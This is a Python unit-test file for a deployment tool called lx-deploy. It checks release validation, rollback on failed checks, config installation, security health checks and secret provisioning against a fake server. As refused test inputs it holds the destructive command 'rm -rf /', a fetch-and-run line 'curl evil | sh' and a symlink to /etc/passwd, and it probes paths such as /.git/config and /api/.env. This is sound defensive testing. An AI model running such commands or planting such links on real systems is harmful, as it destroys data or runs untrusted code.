"""Tests for lx-deploy with a fake server: no Docker, no network, no GitHub.
Run from the repository root: python3 -m unittest discover -s server/tests -v"""

import contextlib
import io
import json
import os
import re
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
os.environ["LX_TEST"] = "1"
import sys

sys.path.insert(0, str(ROOT / "server"))
from lxdeploy import checks as health_checks
from lxdeploy import config as configuration
from lxdeploy import deploy as deployment
from lxdeploy import layout, reporting, system
from lxdeploy import release as release_rules
from lxdeploy import secrets as provisioning
from lxdeploy import state as state_store

COMMIT = "a" * 40
COMMIT2 = "b" * 40


def image(name, n):
    return f"ghcr.io/gzjwyg/{name}@sha256:{n * 64}"


def release(n="1", checks="basic", run="", **overrides):
    images = {name: image(name, n) for name in ("shared-account", "rat-webs", "nobody")}
    images.update(overrides)
    return {"images": images, "checks": checks, "run": run}


class Result:
    def __init__(self, passed):
        self.passed = passed
        self.lines = [(passed, "everything")]


class FakeServer:
    """Answers the commands lx-deploy runs, and records them."""

    def __init__(self):
        self.calls = []
        self.fail = []
        self.up_results = []
        self.commit = COMMIT
        self.www_files = {"index.html": "page"}
        self.www_link = False
        self.responses = {}

    def sh(self, command, *, input=None, check=True, quiet=False, timeout=900):
        self.calls.append(list(command))
        code, out = 0, b""
        if command[0] == "git" and "rev-parse" in command:
            out = (self.commit + "\n").encode()
        elif command[:2] == ["docker", "create"]:
            out = b"container1\n"
        elif command[:2] == ["docker", "cp"]:
            target = Path(command[3])
            target.mkdir(parents=True)
            for name, text in self.www_files.items():
                (target / name).write_text(text)
            if self.www_link:
                os.symlink("/etc/passwd", target / "passwd")
        elif command[:3] == ["docker", "compose", "--project-directory"] and command[4] == "up":
            code = 0 if not self.up_results else (0 if self.up_results.pop(0) else 1)
        elif command[:2] == ["docker", "run"] and "python" in command:
            out = b"$2b$12$" + b"A" * 53 + b"\n"
        elif command[:2] == ["docker", "run"] and "node" in command:
            out = "小红\nXiaohong\nxiaohong\n".encode()
        for prefix in self.fail:
            if command[: len(prefix)] == prefix:
                code = 1
        if check and code:
            raise system.CommandFailed(command[:3], code)
        return subprocess.CompletedProcess(command, code, out, b"")

    def compose(self, *args, check=True, timeout=900):
        return self.sh(["docker", "compose", "--project-directory", str(layout.L.etc), *args], check=check)

    def request(self, target, method, path, headers=None, body=None):
        self.calls.append(["request", str(target), method, path])
        key = (target, method, path.split("?")[0], (headers or {}).get("Origin"))
        if key in self.responses:
            return self.responses[key]
        return good_answer(target, method, path, headers or {})

    def wait(self, seconds):
        pass

    def ran(self, *prefix):
        return [call for call in self.calls if call[: len(prefix)] == list(prefix)]


HSTS = [("Strict-Transport-Security", "max-age=31536000")]


def good_answer(target, method, path, headers):
    """What a healthy server answers to every check."""
    if isinstance(target, int):
        return 200, [], b"ok\n"
    path = path.split("?")[0]
    if path in (
        "/internal/accounts/names",
        "/wp-login.php",
        "/api/.env",
        "/.git/config",
        "/token",
        "/userinfo",
    ):
        return 404, HSTS, b""
    if path == "/.well-known/openid-configuration":
        return 200, HSTS, json.dumps({"issuer": "https://account.lixingzhuyi.com"}).encode()
    if path == "/api/auth/login":
        site = "library" if target.startswith("library.") else "forum"
        return (
            303,
            HSTS
            + [
                ("Location", "https://account.lixingzhuyi.com/authorize?client_id=" + site),
                ("Set-Cookie", f"__Host-{site}-flow=x; HttpOnly; Path=/; SameSite=lax; Secure"),
            ],
            b"",
        )
    if path.startswith("/staff/comment-reports"):
        origin = headers.get("Origin")
        if origin == "https://forum.lixingzhuyi.com":
            return 204, [("Access-Control-Allow-Origin", origin)], b""
        return 403, [], b""
    return 200, HSTS, b"page"


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(lambda: subprocess.run(["rm", "-rf", str(self.tmp)]))
        layout.L = layout.Layout(
            etc=self.tmp / "etc",
            state=self.tmp / "state",
            srv=self.tmp / "srv",
            systemd=self.tmp / "systemd",
            program=self.tmp / "bin" / "lx-deploy",
            monitor=self.tmp / "monitor",
            caddyfile=self.tmp / "caddy" / "Caddyfile",
        )
        layout.L.repo.mkdir(parents=True)
        layout.L.etc.mkdir(parents=True)
        (layout.L.repo / "home").mkdir()
        (layout.L.repo / "home" / "index.html").write_text("<p>home</p>")
        self.server = FakeServer()
        self.checks = []
        patcher = mock.patch.object(health_checks, "run_checks", side_effect=self.fake_checks)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.reports = []
        patcher = mock.patch.object(reporting, "report", side_effect=lambda *a, **k: self.reports.append(a))
        patcher.start()
        self.addCleanup(patcher.stop)

    def fake_checks(self, server, level):
        self.checks.append(level)
        return Result(self.next_checks.pop(0) if getattr(self, "next_checks", None) else True)

    def publish(self, data, commit=COMMIT):
        (layout.L.repo / "release.json").write_text(json.dumps(data) if not isinstance(data, str) else data)
        self.server.commit = commit

    def run_quietly(self, **kwargs):
        with contextlib.redirect_stdout(io.StringIO()):
            return deployment.cmd_run(self.server, **kwargs)

    def dotenv(self):
        return (layout.L.etc / ".env").read_text()


class ReleaseFile(unittest.TestCase):
    def check(self, data):
        return release_rules.validate_release(json.dumps(data) if not isinstance(data, str) else data)

    def test_accepts_our_digests(self):
        result, errors = self.check(release(articledb=image("articledb", "4")))
        self.assertEqual(errors, [])
        self.assertEqual(result["checks"], "basic")

    def test_refuses_anything_else(self):
        bad = [
            "not json",
            [],
            {**release(), "command": "rm -rf /"},
            release(**{"rat-webs": "ghcr.io/gzjwyg/rat-webs:latest"}),
            release(**{"rat-webs": image("nobody", "1")}),
            release(**{"rat-webs": "docker.io/gzjwyg/rat-webs@sha256:" + "1" * 64}),
            release(**{"rat-webs": "ghcr.io/gzjwyg/rat-webs@sha256:" + "1" * 63}),
            release(**{"something": image("something", "1")}),
            release(checks="all"),
            release(run="x" * 101),
            release(run="two\nlines"),
            {"images": {"rat-webs": image("rat-webs", "1")}},
            json.dumps(release()) + " " * 5000,
        ]
        for data in bad:
            with self.subTest(data=str(data)[:60]):
                result, errors = self.check(data)
                self.assertIsNone(result)
                self.assertTrue(errors)
        self.assertEqual(release_rules.validate_release(None)[1], ["release.json is missing"])


class SettingsFiles(Base):
    def test_round_trip_keeps_dollar_signs_and_is_private(self):
        path = layout.L.env / "rat-webs.env"
        values = {"RATWEBS_ADMIN_PASSWORD_HASH": "$2b$12$" + "A" * 53, "EMPTY": ""}
        state_store.write_env(path, values, "test")
        self.assertEqual(state_store.read_env(path), values)
        self.assertEqual(path.stat().st_mode & 0o777, 0o600)

    def test_refuses_values_that_would_break_the_file(self):
        for value in ("it's", "two\nlines"):
            with self.assertRaises(ValueError):
                state_store.write_env(layout.L.env / "x.env", {"KEY": value}, "test")


class Deploying(Base):
    def test_first_deployment(self):
        self.publish(release("1"))
        self.assertEqual(self.run_quietly(), 0)
        for name in ("shared-account", "rat-webs", "nobody"):
            self.assertIn(image(name, "1"), self.dotenv())
            self.assertIn(["docker", "pull", "--quiet", image(name, "1")], self.server.calls)
        self.assertFalse(
            self.server.ran("docker", "compose", "--project-directory", str(layout.L.etc), "run"),
            "nothing to back up before the first deployment",
        )
        for name in ("rat-webs", "nobody"):
            link = layout.L.www / name
            self.assertEqual(Path(os.readlink(link)).name, f"{name}-{'1' * 12}")
            self.assertEqual(((link / "index.html").stat().st_mode & 0o777), 0o644)
        self.assertTrue((layout.L.www / "home" / "index.html").is_file())
        state = state_store.load_state()
        self.assertEqual(state["current"]["images"]["nobody"], image("nobody", "1"))
        self.assertEqual(self.reports[-1][1], "success")

    def test_same_commit_does_nothing(self):
        self.publish(release("1"))
        self.run_quietly()
        before = len(self.server.calls)
        self.assertEqual(self.run_quietly(), 0)
        self.assertEqual([c for c in self.server.calls[before:] if c[0] != "git"], [])

    def test_update_backs_up_first_then_records_previous_and_prunes(self):
        self.publish(release("1"))
        self.run_quietly()
        self.publish(release("2"), COMMIT2)
        self.run_quietly()
        self.publish(release("3"), "c" * 40)
        self.assertEqual(self.run_quietly(), 0)
        runs = self.server.ran("docker", "compose", "--project-directory", str(layout.L.etc), "run")
        self.assertTrue(any("service.cli" in call and "backup" in call for call in runs))
        self.assertTrue(any("/app/backup.mjs" in call for call in runs))
        last_backup = max(i for i, c in enumerate(self.server.calls) if c in runs)
        last_up = max(i for i, c in enumerate(self.server.calls) if "up" in c and "compose" in c)
        self.assertLess(last_backup, last_up, "backups run before the new versions start")
        state = state_store.load_state()
        self.assertEqual(state["previous"]["images"]["rat-webs"], image("rat-webs", "2"))
        kept = sorted(p.name for p in (layout.L.www / ".releases").iterdir() if p.name.startswith("rat-webs"))
        self.assertEqual(kept, [f"rat-webs-{'2' * 12}", f"rat-webs-{'3' * 12}"])

    def test_failed_checks_put_the_previous_versions_back(self):
        self.publish(release("1"))
        self.run_quietly()
        self.publish(release("2"), COMMIT2)
        self.next_checks = [False, True]
        self.assertEqual(self.run_quietly(), 1)
        self.assertIn(image("rat-webs", "1"), self.dotenv())
        self.assertNotIn(image("rat-webs", "2"), self.dotenv())
        self.assertEqual(Path(os.readlink(layout.L.www / "rat-webs")).name, f"rat-webs-{'1' * 12}")
        self.assertEqual(state_store.load_state()["current"]["images"]["rat-webs"], image("rat-webs", "1"))
        self.assertEqual(self.checks, ["basic", "basic", "basic"])
        self.assertEqual(self.reports[-1][1], "failure")
        self.assertIn("previous versions are running again", self.reports[-1][2])

    def test_unhealthy_start_also_rolls_back(self):
        self.publish(release("1"))
        self.run_quietly()
        self.publish(release("2"), COMMIT2)
        self.server.up_results = [False, True]
        self.assertEqual(self.run_quietly(), 1)
        self.assertIn(image("nobody", "1"), self.dotenv())

    def test_refused_release_changes_nothing(self):
        self.publish({**release("1"), "script": "curl evil | sh"})
        self.assertEqual(self.run_quietly(), 1)
        self.assertEqual([c for c in self.server.calls if c[0] != "git"], [])
        self.assertFalse((layout.L.etc / ".env").exists())
        self.assertEqual(self.reports[-1][1], "failure")

    def test_failed_download_changes_nothing(self):
        self.publish(release("1"))
        self.run_quietly()
        self.publish(release("2"), COMMIT2)
        self.server.fail = [["docker", "pull", "--quiet", image("nobody", "2")]]
        self.assertEqual(self.run_quietly(), 1)
        self.assertIn(image("rat-webs", "1"), self.dotenv())
        self.assertEqual(state_store.load_state()["current"]["images"]["rat-webs"], image("rat-webs", "1"))

    def test_links_in_static_files_are_refused(self):
        self.server.www_link = True
        self.publish(release("1"))
        self.assertEqual(self.run_quietly(), 1)
        self.assertFalse((layout.L.etc / ".env").exists())
        self.assertFalse((layout.L.www / "rat-webs").exists())
        self.assertIn("link", " ".join(self.reports[-1][3]))

    def test_new_run_label_checks_again_without_downloads(self):
        self.publish(release("1"))
        self.run_quietly()
        pulls = len(self.server.ran("docker", "pull"))
        self.publish(release("1", checks="full", run="dry run 1"), COMMIT2)
        self.assertEqual(self.run_quietly(), 0)
        self.assertEqual(len(self.server.ran("docker", "pull")), pulls)
        self.assertEqual(self.checks[-1], "full")

    def test_commit_without_version_change_only_reports(self):
        self.publish(release("1"))
        self.run_quietly()
        checks = len(self.checks)
        self.publish(release("1"), COMMIT2)
        self.assertEqual(self.run_quietly(), 0)
        self.assertEqual(len(self.checks), checks)
        self.assertEqual(self.reports[-1][2], "No version changed")

    def test_home_refuses_file_types_it_does_not_serve(self):
        (layout.L.repo / "home" / "run.sh").write_text("echo")
        self.publish(release("1"))
        self.assertEqual(self.run_quietly(), 1)
        self.assertEqual(self.reports[-1][2], "Not deployed: home/ was refused; nothing was changed")
        self.assertFalse((layout.L.www / "home").exists())
        self.assertFalse(self.server.ran("docker"))


class ApplyConfig(Base):
    def setUp(self):
        super().setUp()
        for source in (
            "server/compose.yaml",
            "caddy/Caddyfile",
            "caddy/sites.caddy",
            "caddy/common.caddy",
            "caddy/account.caddy",
            "server/watch.json",
            "server/monitor/watch.py",
            "server/lx-deploy",
            "server/systemd/lx-deploy.timer",
            "server/systemd/lx-deploy.service",
        ):
            target = layout.L.repo / source
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(f"new {source}\n")

    def apply(self):
        with contextlib.redirect_stdout(io.StringIO()) as out:
            code = configuration.cmd_apply_config(self.server, yes=True)
        return code, out.getvalue()

    def test_installs_validates_and_reloads(self):
        code, _ = self.apply()
        self.assertEqual(code, 0)
        self.assertEqual((layout.L.etc / "caddy" / "sites.caddy").read_text(), "new caddy/sites.caddy\n")
        self.assertEqual(layout.L.caddyfile.read_text(), layout.MAIN_CADDYFILE)
        self.assertEqual((layout.L.etc / "watch.json").stat().st_mode & 0o777, 0o600)
        self.assertTrue(self.server.ran("caddy", "validate"))
        self.assertIn(["systemctl", "reload-or-restart", "caddy"], self.server.calls)
        self.assertIn(["systemctl", "enable", "--now", "lx-deploy.timer"], self.server.calls)
        self.assertEqual(configuration.config_drift(), [])
        self.assertEqual(
            self.apply(), (0, "The server already has every file in the repository. Nothing to do.\n")
        )

    def test_invalid_caddy_file_restores_the_old_files(self):
        self.apply()
        (layout.L.repo / "caddy" / "sites.caddy").write_text("broken {\n")
        (layout.L.repo / "server" / "systemd" / "lx-new.timer").write_text("[Timer]\n")
        self.server.fail = [["caddy", "validate"]]
        self.server.calls = []
        code, out = self.apply()
        self.assertEqual(code, 1)
        self.assertIn("previous files are back", out)
        self.assertEqual((layout.L.etc / "caddy" / "sites.caddy").read_text(), "new caddy/sites.caddy\n")
        self.assertFalse((layout.L.systemd / "lx-new.timer").exists())
        self.assertFalse(self.server.ran("systemctl", "reload-or-restart"), "Caddy keeps its old files")

    def test_asks_before_changing_anything(self):
        with mock.patch("builtins.input", return_value="no"), contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(configuration.cmd_apply_config(self.server), 1)
        self.assertFalse((layout.L.etc / "compose.yaml").exists())


    def test_installed_launcher_imports_its_package_and_failed_update_restores_it(self):
        # Install real Python files into the fake checkout, then run only --help in isolation.
        # All deployment/Caddy/systemd actions still go through FakeServer.
        for source, _, _ in configuration.config_files():
            if source == "server/lx-deploy" or source.startswith("server/lxdeploy/"):
                target = layout.L.repo / source
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes((ROOT / source).read_bytes())
        code, _ = self.apply()
        self.assertEqual(code, 0)
        result = subprocess.run(
            [sys.executable, str(layout.L.program), "--help"], cwd=self.tmp,
            env={**os.environ, "PYTHONPATH": ""}, text=True, capture_output=True, check=True,
        )
        self.assertIn("apply-config", result.stdout)
        installed = layout.L.program.parent / "lxdeploy" / "checks.py"
        original = installed.read_bytes()
        source = layout.L.repo / "server" / "lxdeploy" / "checks.py"
        source.write_text(source.read_text() + "\n# Pending package update\n")
        self.server.fail = [["caddy", "validate"]]
        code, _ = self.apply()
        self.assertEqual(code, 1)
        self.assertEqual(installed.read_bytes(), original)


class Checking(unittest.TestCase):
    def setUp(self):
        self.server = FakeServer()

    def run_basic(self):
        checks = health_checks.Checks(self.server)
        checks.basic()
        return checks

    def test_a_healthy_server_passes(self):
        checks = self.run_basic()
        self.assertTrue(checks.passed, reporting.check_lines(checks))
        self.assertGreaterEqual(len(checks.lines), 14)

    def failing(self, key, answer):
        self.server.responses[key] = answer
        checks = self.run_basic()
        self.assertFalse(checks.passed)
        return [text for ok, text in checks.lines if not ok]

    def test_internal_path_reaching_an_application_fails(self):
        failed = self.failing(
            ("forum.lixingzhuyi.com", "GET", "/internal/accounts/names", None), (200, [], b"")
        )
        self.assertEqual(failed, ["forum.lixingzhuyi.com refuses /internal/, PHP probes and dotfiles"])

    def test_cookie_for_the_parent_domain_fails(self):
        answer = (
            303,
            [
                ("Location", "https://account.lixingzhuyi.com/authorize?x"),
                ("Set-Cookie", "__Host-library-flow=x; Secure; HttpOnly; Domain=lixingzhuyi.com"),
            ],
            b"",
        )
        failed = self.failing(("library.lixingzhuyi.com", "GET", "/api/auth/login", None), answer)
        self.assertEqual(len(failed), 1)

    def test_staff_path_open_to_any_origin_fails(self):
        answer = (204, [("Access-Control-Allow-Origin", "*")], b"")
        failed = self.failing(
            ("library.lixingzhuyi.com", "OPTIONS", "/staff/comment-reports", "https://example.invalid"),
            answer,
        )
        self.assertEqual(len(failed), 1)

    def test_full_checks_that_break_count_as_failed(self):
        self.server.fail = [["docker", "compose", "--project-directory", str(layout.L.etc), "stop"]]
        with mock.patch.object(health_checks.Checks, "live_counts", return_value={}):
            checks = health_checks.run_checks(self.server, "full")
        self.assertFalse(checks.passed)
        self.assertEqual(checks.lines[-1], (False, "the checks stopped early (CommandFailed)"))

    def test_a_check_that_cannot_run_fails_with_the_error_kind_only(self):
        def broken(*args, **kwargs):
            raise ConnectionRefusedError("details that might be private")

        self.server.request = broken
        checks = self.run_basic()
        self.assertFalse(checks.passed)
        self.assertTrue(
            all(
                "ConnectionRefusedError" in text and "private" not in text
                for ok, text in checks.lines
                if not ok
            )
        )


class Secrets(Base):
    def answers(self, **values):
        defaults = {
            "QQ address": "",
            "Administrator name": "editor",
            "Password": "correct horse battery",
            "same password": "correct horse battery",
            "DeepSeek": "",
            "Zhipu": "",
            "alerts": "owner@example.com",
        }
        defaults.update(values)

        def answer(prompt, secret=False):
            for key, value in defaults.items():
                if key in prompt:
                    return value
            raise AssertionError(prompt)

        return mock.patch.object(provisioning, "ask", side_effect=answer)

    def test_creates_matching_secrets_and_never_prints_them(self):
        self.publish(release("1"))
        with self.answers(), contextlib.redirect_stdout(io.StringIO()) as out:
            provisioning.cmd_init_secrets(self.server)
        env = {
            name: state_store.read_env(layout.L.env / f"{name}.env") for name in ("shared-account", "rat-webs", "nobody")
        }
        internal = {values["ACCOUNT_INTERNAL_SECRET"] for values in env.values()}
        self.assertEqual(len(internal), 1)
        self.assertEqual(len(internal.pop()), 64)
        self.assertEqual(env["rat-webs"]["NOBODY_INTERNAL_SECRET"], env["nobody"]["NOBODY_INTERNAL_SECRET"])
        self.assertNotEqual(env["rat-webs"]["ACCOUNT_CLIENT_SECRET"], env["nobody"]["ACCOUNT_CLIENT_SECRET"])
        self.assertRegex(env["rat-webs"]["RATWEBS_ADMIN_PASSWORD_HASH"], r"^\$2b\$12\$")
        clients = json.loads((layout.L.srv / "shared-account" / "clients.json").read_text())
        self.assertEqual(clients["library"]["secret"], env["rat-webs"]["ACCOUNT_CLIENT_SECRET"])
        self.assertEqual(clients["forum"]["redirect_uri"], "https://forum.lixingzhuyi.com/api/auth/callback")
        self.assertEqual(clients["forum"]["logout_uri"], "http://127.0.0.1:8000/internal/oidc/logout")
        names = (layout.L.srv / "shared-account" / "reserved-names.txt").read_text()
        self.assertIn("鼠鼠", names)
        self.assertIn("小红", names)
        password_call = [c for c in self.server.calls if c[:2] == ["docker", "run"] and "python" in c][0]
        self.assertNotIn("correct horse battery", " ".join(password_call))
        printed = out.getvalue()
        for values in env.values():
            for key, value in values.items():
                if value and len(value) > 8:
                    self.assertNotIn(value, printed, key)
        for path in layout.L.env.iterdir():
            self.assertEqual(path.stat().st_mode & 0o777, 0o600)

    def test_running_again_keeps_every_value(self):
        self.publish(release("1"))
        with self.answers(), contextlib.redirect_stdout(io.StringIO()):
            provisioning.cmd_init_secrets(self.server)
        first = (layout.L.env / "shared-account.env").read_text()
        with (
            mock.patch.object(provisioning, "ask", side_effect=AssertionError("asked again")),
            contextlib.redirect_stdout(io.StringIO()),
        ):
            provisioning.cmd_init_secrets(self.server)
        self.assertEqual((layout.L.env / "shared-account.env").read_text(), first)


class TheFilesAgree(unittest.TestCase):
    """The compose file, Caddy's sites, the monitoring config and lx-deploy name the same things."""

    def test_caddy_serves_every_public_host(self):
        sites = (ROOT / "caddy" / "sites.caddy").read_text()
        addresses = re.findall(r"^([a-z0-9.,\s-]+?) \{$", sites, re.M)
        hosts = {host.strip() for line in addresses for host in line.split(",")}
        self.assertTrue(set(layout.PUBLIC_HOSTS) <= hosts, hosts)
        for facts in layout.SERVICES.values():
            self.assertIn(
                f"127.0.0.1:{facts['port']}", sites + (ROOT / "caddy" / "account.caddy").read_text()
            )

    def test_compose_names_the_services_and_ports(self):
        compose = (ROOT / "server" / "compose.yaml").read_text()
        services = re.findall(r"^  ([a-z-]+):$", compose.split("\nservices:\n")[1], re.M)
        self.assertEqual(services, list(layout.SERVICES) + list(layout.JOBS))
        for name, facts in layout.SERVICES.items():
            self.assertIn(f'PORT: "{facts["port"]}"', compose)
            self.assertIn(f"LX_IMAGE_{name.upper().replace('-', '_')}", compose)
            self.assertIn(f'"/srv/lx/{name}:/data"', compose)

    def test_monitoring_watches_the_deployed_names(self):
        watch = json.loads((ROOT / "server" / "watch.json").read_text())
        names = [service["name"] for service in watch["services"]]
        self.assertEqual(names, list(layout.SERVICES) + list(layout.JOBS))
        for service in watch["services"]:
            if service["name"] in layout.SERVICES:
                self.assertEqual(service["host"], layout.SERVICES[service["name"]]["host"])

    def test_timers_exist(self):
        for timer in layout.TIMERS:
            self.assertTrue((ROOT / "server" / "systemd" / timer).is_file(), timer)
            self.assertTrue((ROOT / "server" / "systemd" / timer.replace(".timer", ".service")).is_file())

    def test_release_in_the_repository_is_valid(self):
        result, errors = release_rules.validate_release((ROOT / "release.json").read_text())
        self.assertEqual(errors, [])


class Reporting(unittest.TestCase):
    def test_reports_carry_no_settings(self):
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(lambda: subprocess.run(["rm", "-rf", str(tmp)]))
        layout.L = layout.Layout(etc=tmp, state=tmp, srv=tmp, systemd=tmp, program=tmp, monitor=tmp, caddyfile=tmp)
        (tmp / "report.token").write_text("token-value\n")
        (tmp / "deploy.json").write_text(json.dumps({"report_issue": 1}))
        sent = []

        def urlopen(request, timeout):
            sent.append((request.full_url, json.loads(request.data), request.headers))
            return io.BytesIO(b"{}")

        with (
            mock.patch.object(reporting.urllib.request, "urlopen", side_effect=urlopen),
            contextlib.redirect_stdout(io.StringIO()),
        ):
            reporting.report(
                COMMIT,
                "success",
                "Deployed and checked (basic)",
                reporting.version_lines({"nobody": image("nobody", "1")}, ["nobody"]),
            )
        self.assertEqual(
            [url for url, _, _ in sent],
            [
                f"https://api.github.com/repos/gzjwyg/deploy/statuses/{COMMIT}",
                "https://api.github.com/repos/gzjwyg/deploy/issues/1/comments",
            ],
        )
        self.assertIn("nobody `111111111111` (new)", sent[1][1]["body"])
        self.assertNotIn("token-value", json.dumps([body for _, body, _ in sent]))


if __name__ == "__main__":
    unittest.main()
